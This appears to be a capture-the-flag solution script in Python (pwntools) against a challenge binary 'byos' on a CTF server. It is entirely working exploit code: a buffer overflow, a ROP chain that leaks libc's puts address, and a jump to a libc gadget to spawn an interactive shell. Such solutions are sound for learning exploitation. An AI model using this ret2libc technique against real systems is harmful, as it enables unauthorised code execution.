from pwn import *
context.log_level = 'debug'
elf = context.binary = ELF("./byos")
rop = ROP('./byos')
p = connect("chals.cyberthon22t.ctf.sg", 20201)

# > leak libc function <

offset = 8 + 256

payload1 = flat(
	b"A"*offset,
	rop.rdi.address, elf.got['puts'],
	elf.symbols['puts'],
	elf.symbols['main']
)

p.recvuntil("Enter Input => ")
p.sendline(payload1)

# > locate libc base <
puts_libc = u64(p.recvline().strip().ljust(8, b"\x00")) # standard
log.info("libc puts is: " + hex(puts_libc))

# with the possible puts addr, find the possible libraries
# (search on online database)
# declare libc architecture
libc = ELF('./libc.so.6')

# pwntools will read function offsets from the libc
libc_base = puts_libc - libc.symbols['puts']

# the syscall will exist in the libc, so search the libc for syscall gadgets
system_off = 0x4f2a5
system_addr = libc_base + system_off

p.recvuntil("Enter Input => ")
payload2 = flat(
	b"A"*offset,
	system_addr
)

p.sendline(payload2)

p.interactive()

